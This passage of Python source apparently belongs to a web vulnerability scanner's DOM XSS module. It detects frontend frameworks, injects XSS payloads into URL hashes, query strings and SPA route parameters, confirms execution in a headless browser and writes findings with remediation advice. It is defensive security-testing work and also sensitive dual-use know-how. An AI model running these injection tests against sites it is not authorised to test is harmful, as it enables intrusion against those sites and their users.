                        url,
                        DOMXSSVector.WINDOW_NAME,
                    )
                    findings.append(finding)
                    logger.info(f"[DOM-XSS] window.name XSS confirmed at {url}")
                    break

        except Exception as e:
            logger.debug(f"[DOM-XSS] window.name test error: {e}")

        return findings

    async def _test_framework_payloads(
        self,
        browser: "HeadlessBrowserEngine",
        url: str,
        marker_id: str,
    ) -> list[Finding]:
        """
        Test framework-specific DOM XSS payloads.

        NEW 2026-02-12: Tests Angular, Vue, React, Svelte, HTMX, Alpine.js
        specific injection patterns that bypass framework sanitization.
        """
        findings: list[Finding] = []

        try:
            # First, detect which framework is in use (FIX 2026-02-16: use safe navigation)
            if not await safe_navigate(browser, url, wait_until="networkidle", timeout=20.0):
                return findings
            await asyncio.sleep(1.0)

            framework = await browser.evaluate("""
                () => {
                    if (window.ng || document.querySelector('[ng-app]') || document.querySelector('[data-ng-app]')) return 'angular';
                    if (window.Vue || document.querySelector('[data-v-]') || document.querySelector('[v-cloak]')) return 'vue';
                    if (window.React || document.querySelector('[data-reactroot]') || document.querySelector('[data-reactid]')) return 'react';
                    if (window.__SVELTE__ || document.querySelector('[class*="svelte-"]')) return 'svelte';
                    if (document.querySelector('[hx-get]') || document.querySelector('[hx-post]')) return 'htmx';
                    if (document.querySelector('[x-data]') || document.querySelector('[x-init]')) return 'alpine';
                    return 'unknown';
                }
            """)

            if framework == 'unknown':
                return findings  # No framework detected, skip

            logger.info(f"[DOM-XSS] Detected framework: {framework}, testing specific payloads")

            # Get framework-specific payloads
            fw_payloads = DOMXSSPayloads.get_framework_payloads(marker_id)

            # Filter payloads by framework
            relevant_payloads = []
            if framework == 'angular':
                relevant_payloads = [p for p in fw_payloads if '{{' in p or 'ng-' in p.lower()]
            elif framework == 'vue':
                relevant_payloads = [p for p in fw_payloads if '{{' in p or 'v-html' in p.lower()]
            elif framework == 'react':
                relevant_payloads = [p for p in fw_payloads if 'dangerouslySetInnerHTML' in p or 'javascript:' in p]
            elif framework == 'svelte':
                relevant_payloads = [p for p in fw_payloads if '@html' in p]
            elif framework == 'htmx':
                relevant_payloads = [p for p in fw_payloads if 'hx-' in p.lower()]
            elif framework == 'alpine':
                relevant_payloads = [p for p in fw_payloads if 'x-data' in p.lower() or 'x-init' in p.lower()]

            # Also test mXSS payloads for all frameworks
            mxss_payloads = [p for p in fw_payloads if '<math>' in p or '<svg>' in p or '<noscript>' in p]
            relevant_payloads.extend(mxss_payloads[:3])

            for payload in relevant_payloads[:5]:
                # Test via URL hash
                test_url = f"{url}#{payload}"

                try:
                    browser.clear_console()
                    # FIX 2026-02-16: Use safe navigation
                    if not await safe_navigate(browser, test_url, wait_until="domcontentloaded"):
                        continue  # Skip this payload, try next
                    await asyncio.sleep(0.8)  # Frameworks need more time

                    # Trigger framework rendering
                    await browser.evaluate("() => window.dispatchEvent(new HashChangeEvent('hashchange'))")
                    await asyncio.sleep(0.3)

                    console_msgs = browser.get_console_messages()
                    marker = f"{XSS_MARKERS['CONSOLE']}{marker_id}"

                    if any(marker in msg for msg in console_msgs):
                        finding = self._create_finding(
                            DOMXSSFinding(
                                vulnerable=True,
                                vector=DOMXSSVector.URL_HASH,
                                sink=f"{framework} template",
                                payload=payload,
                                url=test_url,
                                evidence=[
                                    f"Framework: {framework.upper()}",
                                    f"Template injection confirmed",
                                    f"Payload: {payload[:100]}...",
                                ],
                                console_messages=console_msgs,
                                triggered_alerts=[],
                                screenshot=None,
                                confidence=92.0,
                                execution_time_ms=0,
                            ),
                            test_url,
                            DOMXSSVector.URL_HASH,
                        )
                        finding.name = f"DOM XSS via {framework.upper()} Template Injection"
                        findings.append(finding)
                        logger.warning(f"[DOM-XSS] {framework} template injection at {url}")
                        break

                except Exception as e:
                    logger.debug(f"[DOM-XSS] Framework payload test error: {e}")

        except Exception as e:
            logger.debug(f"[DOM-XSS] Framework detection error: {e}")

        return findings

    def _build_test_url(self, url: str, vector: DOMXSSVector, payload: str) -> str:
        """Build test URL with payload injected."""
        parsed = urlparse(url)

        if vector == DOMXSSVector.URL_HASH:
            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}#{payload}"

        elif vector == DOMXSSVector.URL_SEARCH:
            # Add payload as a new parameter
            separator = "&" if parsed.query else ""
            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{parsed.query}{separator}xss={payload}"

        elif vector == DOMXSSVector.URL_PATHNAME:
            return f"{parsed.scheme}://{parsed.netloc}/{payload}"

        return url

    # ------------------------------------------------------------------
    # SPA Route Testing (Angular / React / Vue hash-based routing)
    # ------------------------------------------------------------------

    async def _discover_spa_routes(
        self,
        browser: "HeadlessBrowserEngine",
        base_url: str,
    ) -> list[dict[str, Any]]:
        """Discover SPA hash routes by crawling anchor tags and routerLink attrs."""
        routes: list[dict[str, Any]] = []

        try:
            # FIX 2026-02-16: Use safe navigation
            if not await safe_navigate(browser, base_url, wait_until="networkidle", timeout=20.0):
                return routes
            await asyncio.sleep(1.5)  # Let SPA framework initialize

            raw_links = await browser.execute_js(
                """() => {
                    const hrefs = new Set();
                    for (const a of document.querySelectorAll('a[href]')) {
                        const h = a.getAttribute('href') || '';
                        if (h.includes('#/')) hrefs.add(h);
                    }
                    for (const el of document.querySelectorAll('[routerLink]')) {
                        const rl = el.getAttribute('routerLink') || '';
                        if (rl.startsWith('/')) hrefs.add('#' + rl);
                    }
                    return Array.from(hrefs);
                }"""
            )

            if raw_links:
                for link in raw_links:
                    route = link.split('#')[-1] if '#' in link else link
                    route_path = route.split('?')[0].split(';')[0].strip('/')
                    if route_path and route_path != '/':
                        routes.append({"route": route_path, "source": "crawled"})

            logger.info(f"[DOM-XSS] Discovered {len(routes)} SPA routes from page")

        except Exception as e:
            logger.debug(f"[DOM-XSS] SPA route discovery error: {e}")

        # Add common fallback routes if discovery found very few
        if len(routes) < 3:
            for route_name in SPA_ROUTE_PARAMS:
                if route_name != "__default__":
                    routes.append({"route": route_name, "source": "fallback"})

        # Deduplicate
        seen: set[str] = set()
        unique: list[dict[str, Any]] = []
        for r in routes:
            key = r["route"].lower().strip('/')
            if key not in seen:
                seen.add(key)
                unique.append(r)

        return unique

    async def _test_spa_routes(
        self,
        browser: "HeadlessBrowserEngine",
        base_url: str,
        routes: list[dict[str, Any]],
        rate_limiter: "RateLimiter",
        host: str,
    ) -> list[Finding]:
        """Test SPA hash routes for DOM XSS by injecting payloads into route params."""
        findings: list[Finding] = []

        for route_info in routes[:15]:
            route_path = route_info["route"]

            # Determine params to test based on the route's last segment
            route_base = route_path.rstrip('/').split('/')[-1].lower()
            params_to_test = SPA_ROUTE_PARAMS.get(
                route_base, SPA_ROUTE_PARAMS["__default__"]
            )

            for param in params_to_test[:3]:
                await rate_limiter.acquire(host)

                marker_id = hashlib.md5(
                    f"spa_{route_path}_{param}_{time.time()}".encode()
                ).hexdigest()[:8]

                payloads = DOMXSSPayloads.get_payloads_for_vector(
                    DOMXSSVector.URL_HASH, marker_id
                )

                found_xss = False
                for payload in payloads[:5]:
                    # Build SPA route URL: base/#/route?param=payload
                    test_url = f"{base_url.rstrip('/')}/#/{route_path}?{param}={payload}"

                    try:
                        # FIX 2026-02-16: Use safe navigation
                        if not await safe_navigate(browser, test_url, wait_until="domcontentloaded"):
                            continue  # Skip this payload, try next
                        await asyncio.sleep(1.0)  # SPA routes need render time

                        console_messages = browser.get_console_messages()
                        dialogs = browser.get_dialogs()

                        marker_found = False
                        evidence = []

                        for msg in console_messages:
                            if XSS_MARKERS["CONSOLE"] + marker_id in msg:
                                marker_found = True
                                evidence.append(f"Console: {msg}")

                        for dialog in dialogs:
                            if XSS_MARKERS["ALERT"] + marker_id in dialog:
                                marker_found = True
                                evidence.append(f"Dialog: {dialog}")

                        if marker_found:
                            screenshot = None
                            try:
                                screenshot = await browser.screenshot()
                            except Exception:
                                pass

                            finding = Finding(
                                vuln_type=VulnType.XSS_DOM,
                                name=f"DOM XSS via SPA Route /#/{route_path}?{param}=",
                                severity=Severity.HIGH,
                                description=(
                                    f"DOM-based Cross-Site Scripting confirmed in SPA route "
                                    f"`/#/{route_path}` via the `{param}` parameter. "
                                    f"The application reads route parameters and renders them "
                                    f"into the DOM without proper sanitization. "
                                    f"Verified by actual JavaScript execution in a headless "
                                    f"browser — zero false positive."
                                ),
                                host=host,
                                endpoint=test_url,
                                evidence=[
                                    f"Vector: SPA hash route parameter",
                                    f"Route: /#/{route_path}",
                                    f"Parameter: {param}",
                                    f"Payload: {payload}",
                                    f"Confidence: 95%",
                                    f"Execution verified: YES (real browser)",
                                ] + evidence,
                                cvss_score=7.1,
                                cwe_id="CWE-79",
                                confidence=95.0,
                                remediation=(
                                    "1. Sanitize all route parameters before rendering\n"
                                    "2. Do not use bypassSecurityTrustHtml with user input\n"
                                    "3. Use textContent instead of innerHTML\n"
                                    "4. Implement Content-Security-Policy\n"
                                    "5. Use DOMPurify for HTML sanitization"
                                ),
                                metadata={
                                    "dom_xss_type": "spa_route",
                                    "route": route_path,
                                    "parameter": param,
                                    "payload": payload,
                                    "screenshot": screenshot is not None,
                                },
                            )
                            findings.append(finding)
                            logger.info(
                                f"[DOM-XSS] CONFIRMED: DOM XSS in /#/{route_path}?{param}="
                            )
                            found_xss = True
                            break  # Found XSS for this param

                    except Exception as e:
                        logger.debug(f"[DOM-XSS] SPA route test error: {e}")

                # P1-FIX 2026-02-11: Removed double break that stopped testing
                # other params after finding XSS in first param.
                # We should test ALL params on a route, not stop at first finding.

        return findings

    def _detect_sink(self, payload: str) -> Optional[DOMXSSSink]:
        """Detect likely sink based on payload structure."""
        payload_lower = payload.lower()

        if "innerhtml" in payload_lower or "<" in payload:
            return DOMXSSSink.INNERHTML
        elif "document.write" in payload_lower:
            return DOMXSSSink.DOCUMENT_WRITE
        elif "eval(" in payload_lower:
            return DOMXSSSink.EVAL
        elif "settimeout" in payload_lower:
            return DOMXSSSink.SETTIMEOUT
        elif ".html(" in payload_lower:
            return DOMXSSSink.JQUERY_HTML
        elif "location" in payload_lower:
            return DOMXSSSink.LOCATION

        return None

    def _create_finding(
        self,
        result: DOMXSSFinding,
        url: str,
        vector: DOMXSSVector,
    ) -> Finding:
        """Create Finding object from DOMXSSFinding."""
        parsed = urlparse(url)
        host = parsed.netloc

        evidence_list = [
            f"Vector: {vector.name}",
            f"Payload: {result.payload}",
            f"Confidence: {result.confidence}%",
            f"Execution verified: YES (real browser)",
            f"Execution time: {result.execution_time_ms:.2f}ms",
        ]

        if result.sink:
            evidence_list.append(f"Likely sink: {result.sink.value}")

        evidence_list.extend(result.evidence)

        return Finding(
            vuln_type=VulnType.XSS_DOM,
            name=f"Confirmed DOM XSS via {vector.name}",
            severity=Severity.HIGH,
            description=(
                f"DOM-based Cross-Site Scripting vulnerability CONFIRMED with real JavaScript execution. "
                f"User-controlled data from {vector.name} flows to a dangerous sink without sanitization. "
                f"This was verified by actual code execution in a headless browser, not static analysis. "
                f"Confidence: {result.confidence}%"
            ),
            host=host,
            endpoint=result.url,
            evidence=evidence_list,
            cvss_score=7.1,  # DOM XSS typically high severity
            cwe_id="CWE-79",
            confidence=result.confidence,
            remediation=(
                "1. Avoid using dangerous sinks with user-controlled data:\n"
                "   - innerHTML, outerHTML, document.write\n"
                "   - eval(), Function(), setTimeout/setInterval with strings\n"
                "   - jQuery .html(), .append() with user data\n"
                "2. Use textContent instead of innerHTML when possible\n"
                "3. Use DOMPurify library to sanitize HTML\n"
                "4. Implement Content-Security-Policy with strict-dynamic\n"
                "5. Use Trusted Types API for DOM XSS prevention\n"
                "6. Validate and sanitize all URL parameters and hash values"
            ),
            references=[
                "https://owasp.org/www-community/attacks/DOM_Based_XSS",
                "https://portswigger.net/web-security/cross-site-scripting/dom-based",
                "https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html",
                "https://github.com/nicholasaleks/DOM-XSS-vulnerabilities",
                "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/trusted-types",
            ],
        )

    async def _static_analysis_fallback(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: "RateLimiter",
    ) -> dict[str, Any]:
        """
        Fallback to static analysis when headless browser is not available.
        This is less accurate but better than nothing.
        """

        findings = []
        info_items = [{
            "type": "warning",
            "message": "Using static analysis fallback (less accurate than browser-based testing)",
        }]

        # FIXED: Initialize with default before conditional check
        js_files: list[str] = []
        if isinstance(asset_data, dict):
            js_files = asset_data.get("js_files", [])

        # DOM sources and sinks for static analysis
        dom_sources = [
            "document.URL", "document.documentURI", "document.referrer",
            "location.href", "location.search", "location.hash",
            "window.name", "localStorage", "sessionStorage",
        ]

        dom_sinks = [
            "innerHTML", "outerHTML", "document.write", "eval(",
            "Function(", "setTimeout(", "setInterval(", ".html(",
        ]

        for js_url in js_files[:10]:
            await rate_limiter.acquire(host)

            try:
                async with get_scan_client(timeout=self.timeout, verify_ssl=False) as client:
                    response = await client.get(js_url)
                    js_code = response.text

                    sources_found = [s for s in dom_sources if s in js_code]
                    sinks_found = [s for s in dom_sinks if s in js_code]

                    if sources_found and sinks_found:
                        # Potential DOM XSS pattern
                        confidence = min(60 + len(sources_found) * 5 + len(sinks_found) * 5, 80)

                        findings.append(Finding(
                            vuln_type=VulnType.XSS_DOM,
                            name="Potential DOM XSS (Static Analysis)",
                            severity=Severity.MEDIUM,
                            description=(
                                f"Potential DOM XSS detected via static analysis. "
                                f"Found {len(sources_found)} sources and {len(sinks_found)} sinks. "
                                f"Static analysis detection. "
                                f"Install Playwright for runtime-confirmed detection."
                            ),
                            host=host,
                            endpoint=js_url,
                            evidence=[
                                f"Sources: {', '.join(sources_found[:5])}",
                                f"Sinks: {', '.join(sinks_found[:5])}",
                            ],
                            cvss_score=5.4,
                            cwe_id="CWE-79",
                            confidence=confidence,
                            remediation="Install Playwright and re-scan for confirmed results.",
                        ).to_dict())

            except Exception as e:
                logger.debug(f"[DOM-XSS] Static analysis error for {js_url}: {e}")

        return {
            "module": self.name,
            "version": self.version,
            "findings": findings,
            "info": info_items,
            "stats": {
                "js_files_analyzed": len(js_files[:10]),
                "browser_used": False,
            },
        }


# =============================================================================
# CONVENIENCE FUNCTIONS
# =============================================================================

async def quick_dom_xss_scan(url: str) -> list[dict]:
    """
    Quick DOM XSS scan without full scanner setup.

    Usage:
        results = await quick_dom_xss_scan("https://example.com/page")
    """
    if not HEADLESS_AVAILABLE:
        raise ImportError("Playwright not available. Install with: pip install playwright && playwright install")

    async with create_browser() as browser:
        results = await browser.test_dom_xss(url)
        return [
            {
                "vulnerable": r.vulnerable,
                "payload": r.payload,
                "context": r.execution_context,
                "confidence": r.confidence,
                "evidence": r.evidence,
            }
            for r in results
        ]
